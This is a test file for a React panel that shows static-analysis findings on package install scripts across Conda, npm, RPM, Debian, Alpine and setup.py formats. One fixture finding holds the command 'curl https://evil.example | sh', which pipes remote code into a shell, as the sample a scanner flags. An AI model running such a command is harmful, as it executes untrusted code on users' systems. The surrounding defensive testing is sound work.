// @vitest-environment jsdom
import React from "react";
import { describe, it, expect, vi, afterEach } from "vitest";
import { render, screen, cleanup, within } from "@testing-library/react";

import type {
  AnalysisCompleteness,
  InstallScript,
} from "@/types/package-analysis";

// ---------------------------------------------------------------------------
// COVERAGE LIMITS — read before trusting a green run.
//
// The Radix `Collapsible` is replaced by a stub that renders its content
// unconditionally and records the `defaultOpen` prop as a data attribute.
// So the auto-expand RULE (open when any finding is high/critical) is
// asserted, but the actual expand/collapse interaction — clicking the
// trigger, content hidden when closed — is NOT exercised. Nothing here
// renders through Radix.
// ---------------------------------------------------------------------------

// ---------------------------------------------------------------------------
// Mocks
// ---------------------------------------------------------------------------

vi.mock("lucide-react", () => {
  const icon = () => null;
  return {
    AlertTriangle: icon,
    CheckCircle2: icon,
    ChevronDown: icon,
    FileQuestion: icon,
    KeyRound: icon,
    Terminal: icon,
  };
});

vi.mock("@/components/ui/badge", () => ({
  Badge: ({ children, className, ...rest }: React.ComponentProps<"span">) => (
    <span className={className} {...rest}>
      {children}
    </span>
  ),
}));

// Records `defaultOpen` so the auto-expand rule is observable without Radix.
vi.mock("@/components/ui/collapsible", () => ({
  Collapsible: ({
    children,
    defaultOpen,
  }: {
    children: React.ReactNode;
    defaultOpen?: boolean;
    className?: string;
  }) => (
    <div data-testid="collapsible" data-default-open={String(!!defaultOpen)}>
      {children}
    </div>
  ),
  CollapsibleTrigger: ({ children }: { children: React.ReactNode; asChild?: boolean }) => (
    <>{children}</>
  ),
  CollapsibleContent: ({ children }: { children: React.ReactNode }) => <div>{children}</div>,
}));

// ---------------------------------------------------------------------------
// Fixtures
// ---------------------------------------------------------------------------

const COMPLETE: AnalysisCompleteness = {
  status: "complete",
  reason: null,
  files_total: 40,
  files_read: 40,
};
const PARTIAL: AnalysisCompleteness = {
  status: "partial",
  reason: null,
  files_total: 10,
  files_read: 4,
};
const NOT_READ: AnalysisCompleteness = {
  status: "not_read",
  reason: "analyzer disabled",
  files_total: null,
  files_read: null,
};
const UNSUPPORTED: AnalysisCompleteness = {
  status: "unsupported",
  reason: null,
  files_total: null,
  files_read: null,
};

const CLEAN_SCRIPT: InstallScript = {
  path: "info/pre-unlink.sh",
  kind: "pre-unlink",
  size_bytes: 128,
  content_available: true,
  findings: [],
};

const UNREADABLE_SCRIPT: InstallScript = {
  path: "info/post-unlink.bat",
  kind: "post-unlink",
  size_bytes: 2048,
  content_available: false,
  findings: [],
};

const DANGEROUS_SCRIPT: InstallScript = {
  path: "info/post-link.sh",
  kind: "post-link",
  size_bytes: 1536,
  content_available: true,
  findings: [
    {
      rule_id: "SH001",
      severity: "critical",
      title: "Remote code piped into shell",
      description: "curl output is executed without verification",
      line: 12,
      snippet: "curl https://evil.example | sh",
    },
    {
      rule_id: "SH002",
      severity: "high",
      title: "Writes outside the prefix",
      description: null,
      line: null,
      snippet: null,
    },
    {
      rule_id: "SH009",
      severity: "blocker",
      title: "Vendor-specific rule",
      description: null,
      line: 3,
      snippet: null,
    },
  ],
};

const LOW_SCRIPT: InstallScript = {
  path: "info/pre-link.sh",
  kind: "pre-activate",
  size_bytes: 64,
  content_available: true,
  findings: [
    { rule_id: "SH100", severity: "low", title: "Uses echo", description: null, line: 1, snippet: null },
  ],
};

import { InstallScriptsPanel } from "../install-scripts-panel";

const CLEAN_COPY = /No install scripts found$/;
const NOT_INSPECTED_COPY = /Package contents were not inspected/;

describe("InstallScriptsPanel", () => {
  afterEach(() => cleanup());

  describe("three-way empty state", () => {
    it("complete + none → emerald clean copy, and NOT the not-inspected copy", () => {
      render(<InstallScriptsPanel scripts={[]} completeness={COMPLETE} />);
      const clean = screen.getByTestId("scripts-clean");
      expect(clean.textContent).toMatch(CLEAN_COPY);
      expect(clean.className).toMatch(/emerald/);
      expect(screen.queryByText(NOT_INSPECTED_COPY)).toBeNull();
      expect(screen.queryByTestId("scripts-not-inspected")).toBeNull();
    });

    it("not_read + none → neutral not-inspected copy with reason, and NOT the clean copy", () => {
      render(<InstallScriptsPanel scripts={[]} completeness={NOT_READ} />);
      const block = screen.getByTestId("scripts-not-inspected");
      expect(block.textContent).toMatch(NOT_INSPECTED_COPY);
      expect(block.textContent).toContain("analyzer disabled");
      expect(block.className).toMatch(/bg-muted/);
      expect(block.className).not.toMatch(/emerald|red|amber/);
      expect(screen.queryByText(CLEAN_COPY)).toBeNull();
      expect(screen.queryByTestId("scripts-clean")).toBeNull();
    });

    it("unsupported + none → neutral not-inspected copy", () => {
      render(<InstallScriptsPanel scripts={[]} completeness={UNSUPPORTED} />);
      const block = screen.getByTestId("scripts-not-inspected");
      expect(block.textContent).toMatch(/not supported/);
      expect(block.className).not.toMatch(/emerald|red/);
      expect(screen.queryByText(CLEAN_COPY)).toBeNull();
    });

    it("partial + none → amber incomplete banner with files ratio, and NOT the clean copy", () => {
      render(<InstallScriptsPanel scripts={[]} completeness={PARTIAL} />);
      const banner = screen.getByTestId("scripts-partial-banner");
      expect(banner.textContent).toMatch(/may be incomplete/);
      expect(banner.textContent).toContain("Only 4 of 10 files were read");
      expect(banner.className).toMatch(/amber/);
      expect(screen.queryByTestId("scripts-clean")).toBeNull();
      expect(screen.getByTestId("scripts-partial-empty")).toBeDefined();
    });

    it("partial + scripts → banner plus the cards that exist", () => {
      render(<InstallScriptsPanel scripts={[CLEAN_SCRIPT]} completeness={PARTIAL} />);
      expect(screen.getByTestId("scripts-partial-banner")).toBeDefined();
      expect(screen.getAllByTestId("install-script")).toHaveLength(1);
    });
  });

  describe("script cards", () => {
    it("renders kind label, path, size and a script count", () => {
      render(<InstallScriptsPanel scripts={[CLEAN_SCRIPT, DANGEROUS_SCRIPT]} completeness={COMPLETE} />);
      expect(screen.getByText("2 scripts")).toBeDefined();
      const card = screen.getAllByTestId("install-script")[0];
      const kind = within(card).getByTestId("script-kind");
      expect(kind.textContent).toBe("Conda pre-unlink");
      // The raw backend value stays reachable behind the label.
      expect(kind.getAttribute("title")).toBe("pre-unlink");
      expect(within(card).getByText("info/pre-unlink.sh")).toBeDefined();
      expect(within(card).getByText("128 B")).toBeDefined();
    });

    it("zero findings with readable content → emerald 'No static-analysis findings'", () => {
      render(<InstallScriptsPanel scripts={[CLEAN_SCRIPT]} completeness={COMPLETE} />);
      const clean = screen.getByTestId("script-clean");
      expect(clean.textContent).toMatch(/No static-analysis findings/);
      expect(clean.className).toMatch(/emerald/);
      expect(screen.queryByTestId("script-unreadable")).toBeNull();
    });

    it("content_available=false → neutral 'could not be read', and NOT the clean copy", () => {
      render(<InstallScriptsPanel scripts={[UNREADABLE_SCRIPT]} completeness={COMPLETE} />);
      const block = screen.getByTestId("script-unreadable");
      expect(block.textContent).toMatch(/Script present but contents could not be read/);
      expect(block.className).toMatch(/bg-muted/);
      expect(block.className).not.toMatch(/emerald|red/);
      expect(screen.queryByTestId("script-clean")).toBeNull();
      expect(screen.queryByText(/No static-analysis findings/)).toBeNull();
    });

    it("renders findings with severity, rule id, line, description and snippet", () => {
      render(<InstallScriptsPanel scripts={[DANGEROUS_SCRIPT]} completeness={COMPLETE} />);
      const rows = screen.getAllByTestId("script-finding");
      expect(rows).toHaveLength(3);

      const first = rows[0];
      expect(within(first).getByTestId("severity-badge").textContent).toBe("critical");
      expect(within(first).getByText("SH001")).toBeDefined();
      expect(within(first).getByText("L12")).toBeDefined();
      expect(within(first).getByText("Remote code piped into shell")).toBeDefined();
      expect(within(first).getByText("curl output is executed without verification")).toBeDefined();
      const pre = first.querySelector("pre");
      expect(pre?.textContent).toBe("curl https://evil.example | sh");
      expect(pre?.className).toMatch(/bg-muted/);

      // Null line renders "-", null snippet renders no <pre>.
      const second = rows[1];
      expect(within(second).getByText("-")).toBeDefined();
      expect(second.querySelector("pre")).toBeNull();

      // Unknown severity renders verbatim in neutral styling.
      const third = rows[2];
      const badge = within(third).getByTestId("severity-badge");
      expect(badge.textContent).toBe("blocker");
      expect(badge.className).toMatch(/bg-secondary/);
    });

    it("shows the max-severity chip and crit/high count pills", () => {
      render(<InstallScriptsPanel scripts={[DANGEROUS_SCRIPT]} completeness={COMPLETE} />);
      const card = screen.getByTestId("install-script");
      const header = card.firstElementChild as HTMLElement;
      expect(within(header).getByTestId("severity-badge").textContent).toBe("critical");
      expect(within(header).getByText("1 crit")).toBeDefined();
      expect(within(header).getByText("1 high")).toBeDefined();
    });

    it("auto-expands findings only when something is high or critical", () => {
      render(<InstallScriptsPanel scripts={[DANGEROUS_SCRIPT, LOW_SCRIPT]} completeness={COMPLETE} />);
      const collapsibles = screen.getAllByTestId("collapsible");
      expect(collapsibles[0].getAttribute("data-default-open")).toBe("true");
      expect(collapsibles[1].getAttribute("data-default-open")).toBe("false");
    });

    it("renders an unknown script kind verbatim in neutral styling, without a root badge", () => {
      render(<InstallScriptsPanel scripts={[LOW_SCRIPT]} completeness={COMPLETE} />);
      const kind = screen.getByTestId("script-kind");
      expect(kind.textContent).toBe("pre-activate");
      expect(kind.className).not.toMatch(/emerald|red|amber/);
      expect(screen.queryByTestId("script-runs-as-root")).toBeNull();
    });
  });

  describe("cross-format script kinds", () => {
    function scriptOf(kind: string, path: string): InstallScript {
      return { path, kind, size_bytes: 10, content_available: true, findings: [] };
    }

    it.each([
      ["pre-link", "Conda pre-link"],
      ["post-link", "Conda post-link"],
      ["pre-unlink", "Conda pre-unlink"],
      ["preinstall", "npm preinstall"],
      ["install", "npm install"],
      ["postinstall", "npm postinstall"],
      ["prepare", "npm prepare"],
      ["rpm-pre", "RPM %pre"],
      ["rpm-post", "RPM %post"],
      ["rpm-preun", "RPM %preun"],
      ["rpm-postun", "RPM %postun"],
      ["deb-preinst", "Debian preinst"],
      ["deb-postinst", "Debian postinst"],
      ["deb-prerm", "Debian prerm"],
      ["deb-postrm", "Debian postrm"],
      ["apk-pre-install", "Alpine pre-install"],
      ["apk-post-install", "Alpine post-install"],
      ["python-setup-py", "Python setup.py"],
    ])("renders kind %s with the readable label %s", (kind, label) => {
      render(<InstallScriptsPanel scripts={[scriptOf(kind, "x")]} completeness={COMPLETE} />);
      const badge = screen.getByTestId("script-kind");
      expect(badge.textContent).toBe(label);
      expect(badge.getAttribute("title")).toBe(kind);
    });

    it.each([
      "rpm-pre",
      "rpm-post",
      "rpm-preun",
      "rpm-postun",
      "deb-preinst",
      "deb-postinst",
      "deb-prerm",
      "deb-postrm",
      "apk-pre-install",
      "apk-post-install",
    ])("shows a neutral 'runs as root' badge for %s", (kind) => {
      render(<InstallScriptsPanel scripts={[scriptOf(kind, "x")]} completeness={COMPLETE} />);
      const badge = screen.getByTestId("script-runs-as-root");
      expect(badge.textContent).toMatch(/runs as root/);
      // A privilege fact, not a severity: never the severity palette.
      expect(badge.className).not.toMatch(/emerald|red|amber|orange/);
    });

    it.each(["post-link", "pre-link", "postinstall", "preinstall", "python-setup-py"])(
      "does NOT show the root badge for user-privilege kind %s",
      (kind) => {
        render(<InstallScriptsPanel scripts={[scriptOf(kind, "x")]} completeness={COMPLETE} />);
        expect(screen.queryByTestId("script-runs-as-root")).toBeNull();
      },
    );

    it("root badge does not change the clean / unreadable state of the card", () => {
      const clean = scriptOf("deb-postinst", "DEBIAN/postinst");
      const unreadable: InstallScript = { ...scriptOf("rpm-post", "rpm:header#POSTIN"), content_available: false };
      render(<InstallScriptsPanel scripts={[clean, unreadable]} completeness={COMPLETE} />);
      const cards = screen.getAllByTestId("install-script");
      expect(within(cards[0]).getByTestId("script-runs-as-root")).toBeDefined();
      expect(within(cards[0]).getByTestId("script-clean").className).toMatch(/emerald/);
      expect(within(cards[1]).getByTestId("script-runs-as-root")).toBeDefined();
      expect(within(cards[1]).getByTestId("script-unreadable").className).toMatch(/bg-muted/);
      expect(within(cards[1]).queryByTestId("script-clean")).toBeNull();
    });

    it.each([
      ["postinstall", "package.json#scripts.postinstall"],
      ["rpm-post", "rpm:header#POSTIN"],
      ["deb-postinst", "DEBIAN/postinst"],
      ["python-setup-py", "setup.py"],
    ])("renders a non-path locator for %s intact: %s", (kind, path) => {
      render(<InstallScriptsPanel scripts={[scriptOf(kind, path)]} completeness={COMPLETE} />);
      const code = screen.getByTestId("script-path");
      expect(code.tagName).toBe("CODE");
      expect(code.textContent).toBe(path);
      expect(screen.getByTestId("install-script").getAttribute("data-path")).toBe(path);
    });

    it("keys cards on kind + path so two kinds sharing a locator both render", () => {
      const a = scriptOf("rpm-pre", "rpm:header");
      const b = scriptOf("rpm-post", "rpm:header");
      render(<InstallScriptsPanel scripts={[a, b]} completeness={COMPLETE} />);
      expect(screen.getAllByTestId("install-script")).toHaveLength(2);
    });
  });
});
